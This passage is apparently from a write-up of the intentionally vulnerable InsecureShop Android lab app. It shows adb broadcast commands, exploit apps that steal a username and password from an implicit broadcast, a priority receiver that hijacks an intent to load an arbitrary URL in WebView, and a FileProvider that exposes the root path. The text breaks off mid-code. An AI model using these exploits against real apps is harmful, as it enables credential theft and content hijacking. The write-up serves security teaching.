</pre></table></code></div></div><p>But that does not directly impact the ability of another application to trigger the broadcast receiver because we have two types of broadcast receivers:</p><ul><li><strong>Statically Registered Receiver (via Manifest)</strong>: A receiver declared in the manifest with <code class="language-plaintext highlighter-rouge">&lt;receiver&gt;</code> can be exported to allow other apps to send broadcasts to it. If <code class="language-plaintext highlighter-rouge">android:exported="false"</code> is set in the manifest, only the app itself can trigger the receiver.<li><strong>Dynamically Registered Receiver</strong>: When you register a receiver dynamically in your activity (using <code class="language-plaintext highlighter-rouge">registerReceiver()</code>), it only exists while the activity is running. It can receive broadcasts sent by <code class="language-plaintext highlighter-rouge">sendBroadcast()</code> within the same application or by any other application if the receiver is not restricted by permissions. Since it is registered <strong>within the context of the running activity</strong>, it does not need to be exported.</ul><p>Now, let’s craft our exploit code via the AM command utility:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Muhammad</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">am</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nx">com.insecureshop/.AboutUsActivity</span><span class="w">
</span><span class="n">Starting:</span><span class="w"> </span><span class="nx">Intent</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">cmp</span><span class="o">=</span><span class="n">com.insecureshop/.AboutUsActivity</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="n">Warning:</span><span class="w"> </span><span class="nx">Activity</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">started</span><span class="p">,</span><span class="w"> </span><span class="nx">its</span><span class="w"> </span><span class="nx">current</span><span class="w"> </span><span class="nx">task</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">brought</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">front</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Muhammad</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">am</span><span class="w"> </span><span class="nx">broadcast</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">com.insecureshop.CUSTOM_INTENT</span><span class="w"> </span><span class="nt">--es</span><span class="w"> </span><span class="nx">web_url</span><span class="w"> </span><span class="s2">"https://itsfading.github.io"</span><span class="w">
</span><span class="n">Broadcasting:</span><span class="w"> </span><span class="nx">Intent</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">act</span><span class="o">=</span><span class="n">com.insecureshop.CUSTOM_INTENT</span><span class="w"> </span><span class="p">(</span><span class="n">has</span><span class="w"> </span><span class="nx">extras</span><span class="p">)</span><span class="w"> </span><span class="p">}</span><span class="w">
</span><span class="n">Broadcast</span><span class="w"> </span><span class="nx">completed:</span><span class="w"> </span><span class="nx">result</span><span class="o">=</span><span class="mi">0</span><span class="w"> 
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2012.png" alt="image.png" /></p><p>We can also create an exploit app with the following code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">YourActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>

<span class="kd">private</span> <span class="nc">Context</span> <span class="n">context</span><span class="o">;</span> <span class="c1">// Make sure to initialize this context appropriately</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">insecureBroadcast</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// Create an Intent to start the activity</span>
    <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
    <span class="n">intent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.AboutUsActivity"</span><span class="o">);</span>
    <span class="n">startActivity</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>

    <span class="c1">// Delay the broadcast by 1 second</span>
    <span class="k">new</span> <span class="nf">Handler</span><span class="o">(</span><span class="nc">Looper</span><span class="o">.</span><span class="na">getMainLooper</span><span class="o">()).</span><span class="na">postDelayed</span><span class="o">(</span><span class="k">new</span> <span class="nc">Runnable</span><span class="o">()</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
            <span class="n">delayedBroadcast</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">},</span> <span class="mi">1000</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">private</span> <span class="kt">void</span> <span class="nf">delayedBroadcast</span><span class="o">()</span> <span class="o">{</span>
    <span class="c1">// Create an Intent for the broadcast</span>
    <span class="nc">Intent</span> <span class="nc">WebViewintent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"com.insecureshop.CUSTOM_INTENT"</span><span class="o">);</span>
    <span class="nc">WebViewintent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"web_url"</span><span class="o">,</span> <span class="s">"https://itsfading.github.io"</span><span class="o">);</span>
    
    <span class="c1">// Send the broadcast</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">context</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">context</span><span class="o">.</span><span class="na">sendBroadcast</span><span class="o">(</span><span class="nc">WebViewintent</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><h2 id="use-of-implicit-intent-to-send-a-broadcast-with-sensitive-data"><strong>Use of Implicit intent to send a broadcast with sensitive data</strong></h2><blockquote><p><strong>Description:</strong> The use of Implicit intent can allow third-party apps to steal credentials.</p></blockquote><p>In the same activity as before, <code class="language-plaintext highlighter-rouge">AboutUsActivity</code> there is the use of a dynamic broadcast receiver:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre> <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">onSendData</span><span class="o">(</span><span class="nc">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkParameterIsNotNull</span><span class="o">(</span><span class="n">view</span><span class="o">,</span> <span class="s">"view"</span><span class="o">);</span>
    <span class="nc">String</span> <span class="n">userName</span> <span class="o">=</span> <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getUsername</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">userName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwNpe</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="nc">String</span> <span class="n">password</span> <span class="o">=</span> <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getPassword</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">password</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwNpe</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"com.insecureshop.action.BROADCAST"</span><span class="o">);</span>
    <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"username"</span><span class="o">,</span> <span class="n">userName</span><span class="o">);</span>
    <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="n">password</span><span class="o">);</span>
    <span class="n">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
    <span class="nc">TextView</span> <span class="n">textView</span> <span class="o">=</span> <span class="o">(</span><span class="nc">TextView</span><span class="o">)</span> <span class="n">_$_findCachedViewById</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">C0896id</span><span class="o">.</span><span class="na">textView</span><span class="o">);</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkExpressionValueIsNotNull</span><span class="o">(</span><span class="n">textView</span><span class="o">,</span> <span class="s">"textView"</span><span class="o">);</span>
    <span class="n">textView</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">"InsecureShop is an intentionally designed vulnerable android app built in Kotlin."</span><span class="o">);</span>
    <span class="o">}</span>
</pre></table></code></div></div><p>But this time, only the <code class="language-plaintext highlighter-rouge">sendBroadcast</code> function is being implemented without <code class="language-plaintext highlighter-rouge">onReceive</code>. So what we need to do is just receive this broadcast that has the <code class="language-plaintext highlighter-rouge">"com.insecureshop.action.BROADCAST"</code> intent to get the username and password. Since the <code class="language-plaintext highlighter-rouge">AboutUsActivity</code> is exported, we can easily trigger it to send the broadcast, then implement a second exploit app to receive the data. And here is my code for the exploit app:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>

    <span class="c1">// starting the AboutUs Activity to trigger the sendBroadcast</span>
    <span class="nc">Intent</span> <span class="n">triggerBroadCast</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
    <span class="n">triggerBroadCast</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.AboutUsActivity"</span><span class="o">);</span>
    <span class="n">startActivity</span><span class="o">(</span><span class="n">triggerBroadCast</span><span class="o">);</span>

    <span class="nc">BroadcastReceiver</span> <span class="n">receiver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BroadcastReceiver</span><span class="o">()</span> <span class="o">{</span>
        <span class="nd">@Override</span>
        <span class="c1">// Once a broadcast received with a specific intent</span>
        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
                    <span class="c1">// Geting the value from the defined extras</span>
            <span class="nc">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span>
            <span class="nc">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"password"</span><span class="o">);</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"userName: "</span><span class="o">,</span> <span class="n">username</span><span class="o">);</span>
            <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"password: "</span><span class="o">,</span> <span class="n">password</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">};</span>
    <span class="c1">// Waiting for any broadcast with this intent "com.insecureshop.action.BROADCAST"</span>
    <span class="n">registerReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IntentFilter</span><span class="o">(</span><span class="s">"com.insecureshop.action.BROADCAST"</span><span class="o">));</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2013.png" alt="image.png" /></p><p>And here, the username and password have been stolen.</p><h2 id="intercepting-implicit-intent-to-load-arbitrary-url"><strong>Intercepting Implicit intent to load arbitrary URL</strong></h2><blockquote><p><strong>Description:</strong> The use of Implicit intent can allow third-party apps to load any arbitrary URL in WebView.</p></blockquote><p>Actually, I thought that the challenge was repetitive, as we have already exploited the same scenario to load an arbitrary URL in WebView. So I had to seek the challenge hints to know exactly what it meant.</p><p><a href="https://docs.insecureshopapp.com/insecureshop-challenges/intercepting-implicit-intent-to-load-arbitrary-url">Intercepting Implicit intent to load arbitrary URL</a></p><p>It refers to the <code class="language-plaintext highlighter-rouge">com.insecureshop.ProductListActivity</code> it creates an object from the <code class="language-plaintext highlighter-rouge">ProductDetailBroadCast</code> class:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">ProductListActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">HashMap</span> <span class="n">_$_findViewCache</span><span class="o">;</span>
    <span class="kd">private</span> <span class="kd">final</span> <span class="nc">ProductDetailBroadCast</span> <span class="n">productDetailBroadCast</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ProductDetailBroadCast</span><span class="o">();</span>
    <span class="c1">//....................//</span>
    
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
        <span class="c1">// registring the BroadCast Receiver with the "com.insecureshop.action.PRODUCT_DETAIL" Intent</span>
        <span class="n">registerReceiver</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">productDetailBroadCast</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IntentFilter</span><span class="o">(</span><span class="s">"com.insecureshop.action.PRODUCT_DETAIL"</span><span class="o">));</span>
<span class="o">}</span>
</pre></table></code></div></div><p>So here the app is registering the Broadcast Receiver with the <code class="language-plaintext highlighter-rouge">com.insecureshop.action.PRODUCT_DETAIL</code> Intent. Let’s examine the <code class="language-plaintext highlighter-rouge">ProductDetailBroadCast</code>  class that contains the <code class="language-plaintext highlighter-rouge">onReceive</code>.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">ProductDetailBroadCast</span> <span class="kd">extends</span> <span class="nc">BroadcastReceiver</span> <span class="o">{</span>
<span class="nd">@Override</span> <span class="c1">// android.content.BroadcastReceiver</span>
<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Intent</span> <span class="n">webViewIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"com.insecureshop.action.WEBVIEW"</span><span class="o">);</span>
    <span class="n">webViewIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="s">"https://www.insecureshopapp.com/"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">context</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">context</span><span class="o">.</span><span class="na">startActivity</span><span class="o">(</span><span class="n">webViewIntent</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>When the broadcast is received, it will send the <code class="language-plaintext highlighter-rouge">URL</code> extra to load the <code class="language-plaintext highlighter-rouge">"https://www.insecureshopapp.com/"</code> URL as a WebView. Note that the extra <code class="language-plaintext highlighter-rouge">url</code> is being taken as a fixed value, so we can’t pass it with our intent. The next thought is, where is the <code class="language-plaintext highlighter-rouge">sendBroadcast</code> method being called to trigger this <code class="language-plaintext highlighter-rouge">onReceive</code> method? I have found it in the <code class="language-plaintext highlighter-rouge">com.insecureshop.ProductAdapter</code> class, and it is being triggered when the more info button is clicked.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">holder</span><span class="o">.</span><span class="na">getMBinding</span><span class="o">().</span><span class="na">moreInfo</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="nc">View</span><span class="o">.</span><span class="na">OnClickListener</span><span class="o">()</span> <span class="o">{</span> <span class="c1">// from class: com.insecureshop.ProductAdapter$onBindViewHolder$3</span>
    <span class="nd">@Override</span> <span class="c1">// android.view.View.OnClickListener</span>
    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="nc">View</span> <span class="n">it</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"com.insecureshop.action.PRODUCT_DETAIL"</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="nc">ProductDetail</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getUrl</span><span class="o">());</span>
        <span class="n">context</span><span class="o">.</span><span class="na">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">});</span> 
</pre></table></code></div></div><p>The problem here is that there is no Intent extra data that we can control, all of them are hardcoded into the application. Here we have a registered broadcast receiver that is looking the action or waiting for the Intent filter with the value of <code class="language-plaintext highlighter-rouge">"com.insecureshop.action.PRODUCT_DETAIL"</code> in, which will be triggered as the more info button is clicked on the <code class="language-plaintext highlighter-rouge">ProductDetail</code> activity page. Then the <code class="language-plaintext highlighter-rouge">onReceive</code> method will be triggered to open the <code class="language-plaintext highlighter-rouge">"https://www.insecureshopapp.com"</code> URL in a WebView.</p><p>So to exploit this behavior, logically, we have to create an identical <code class="language-plaintext highlighter-rouge">onReceive</code> method and add our own URL. But we can make the application load our own method and ignore itself??</p><p><strong><code class="language-plaintext highlighter-rouge">android:priority</code></strong> is an attribute used in Android to determine the order in which components such as <strong>broadcast receivers</strong> handle broadcast messages. When multiple components can handle the same broadcast, the <strong>priority</strong> attribute determines which one should process the broadcast first.</p><p><strong>Where It Is Used:</strong> commonly set for broadcast receivers in the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> or dynamically in code using an <code class="language-plaintext highlighter-rouge">IntentFilter</code>.</p><p><strong>How It Works:</strong> The value can range from -<strong>1000</strong> to <strong>1000</strong>. A higher number indicates a higher priority. If not specified, the default priority is 0.</p><p>Great, So let’s create our own Broadcast receiver to overwrite the application receiver:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.insecureshopapp.productlistactivityexploit</span><span class="o">;</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">Context</span> <span class="n">context</span><span class="o">;</span>

    <span class="nd">@Override</span>
    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
        <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>

        <span class="nc">BroadcastReceiver</span> <span class="n">receiver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BroadcastReceiver</span><span class="o">()</span> <span class="o">{</span>
            <span class="nd">@Override</span>
            <span class="c1">// Once a broadcast received with a specific intent</span>
            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="nc">Context</span> <span class="n">context</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// Getting the value from the defined extras</span>
                <span class="nc">Intent</span> <span class="nc">WebViewintent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="s">"com.insecureshop.action.WEBVIEW"</span><span class="o">);</span>
                <span class="nc">WebViewintent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"url"</span><span class="o">,</span> <span class="s">"https://itsfading.github.io"</span><span class="o">);</span>
                <span class="n">startActivity</span><span class="o">(</span><span class="nc">WebViewintent</span><span class="o">);</span>
            <span class="o">}</span>
    <span class="o">};</span>
    <span class="c1">// Waiting for any broadcast with this intent "com.insecureshop.action.PRODUCT_DETAIL"</span>
    <span class="n">registerReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="k">new</span> <span class="nc">IntentFilter</span><span class="o">(</span><span class="s">"com.insecureshop.action.PRODUCT_DETAIL"</span><span class="o">));</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>And the most importantly is to add the <code class="language-plaintext highlighter-rouge">android:priority</code> attribute to the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code>:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span>
<span class="na">package=</span><span class="s">"com.insecureshopapp.productlistactivityexploit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;application</span>
<span class="na">android:allowBackup=</span><span class="s">"true"</span>
<span class="na">android:icon=</span><span class="s">"@mipmap/ic_launcher"</span>
<span class="na">android:label=</span><span class="s">"@string/app_name"</span>
<span class="na">android:roundIcon=</span><span class="s">"@mipmap/ic_launcher_round"</span>
<span class="na">android:supportsRtl=</span><span class="s">"true"</span>
<span class="na">android:theme=</span><span class="s">"@style/Theme.ProductListActivityExploit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;activity</span>
    <span class="na">android:name=</span><span class="s">".MainActivity"</span>
    <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;intent-filter</span> <span class="na">android:priority=</span><span class="s">"1000"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"com.insecureshop.action.PRODUCT_DETAIL"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.MAIN"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.LAUNCHER"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/activity&gt;</span>
<span class="nt">&lt;/application&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2014.png" alt="image.png" /></p><h2 id="insecure-use-of-file-paths-in-file-provider"><strong>Insecure use of File Paths in File Provider</strong></h2><blockquote><p><strong>Description:</strong> The use of wide file sharing declaration can be used to access root directory via content Provider.</p></blockquote><p>Looking at the <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> we will notice that we have two provider declarations:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nt">&lt;provider</span> 
<span class="na">android:name=</span><span class="s">"com.insecureshop.contentProvider.InsecureShopProvider"</span> 
<span class="na">android:readPermission=</span><span class="s">"com.insecureshop.permission.READ"</span> 
<span class="na">android:exported=</span><span class="s">"true"</span> 
<span class="na">android:authorities=</span><span class="s">"com.insecureshop.provider"</span>
<span class="nt">/&gt;</span>

<span class="nt">&lt;provider</span> 
<span class="na">android:name=</span><span class="s">"androidx.core.content.FileProvider"</span> 
<span class="na">android:exported=</span><span class="s">"false"</span> 
<span class="na">android:authorities=</span><span class="s">"com.insecureshop.file_provider"</span> 
<span class="na">android:grantUriPermissions=</span><span class="s">"true"</span><span class="nt">&gt;</span>
<span class="nt">&lt;meta-data</span> <span class="na">android:name=</span><span class="s">"android.support.FILE_PROVIDER_PATHS"</span> <span class="na">android:resource=</span><span class="s">"@xml/provider_paths"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/provider&gt;</span> 
</pre></table></code></div></div><p>Our focus will be on the second provider, as the challenge description specifies that the provider gave access to the root directory. And in the <code class="language-plaintext highlighter-rouge">@xml/provider_paths</code>  the root directory is being shared:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;paths</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;root-path</span> <span class="na">name=</span><span class="s">"root"</span> <span class="na">path=</span><span class="s">"/"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/paths&gt;</span>
</pre></table></code></div></div><p>That means we have access to all files under <code class="language-plaintext highlighter-rouge">/</code> directory of the devices and the word root should be added after the android authorities to trigger the provider like this <code class="language-plaintext highlighter-rouge">content://com.insecureshop.file_provider/root/</code>. But we have a problem here, this provider isn’t exported, which means only this app can be using it.</p><p><strong>Combining Intent Redirection with an Insecure File Provider</strong></p><p>If you remember, we have discovered a vulnerability before that allowed us to access any protected component, and we’ve managed to access the <code class="language-plaintext highlighter-rouge">PrivateActivity</code> Component. Let’s review the vulnerable code again for <code class="language-plaintext highlighter-rouge">com.insecureshop.WebView2Activity</code>:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span> 
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_webview</span><span class="o">);</span>
    <span class="n">setSupportActionBar</span><span class="o">((</span><span class="nc">Toolbar</span><span class="o">)</span> <span class="n">_$_findCachedViewById</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">C0896id</span><span class="o">.</span><span class="na">toolbar</span><span class="o">));</span>
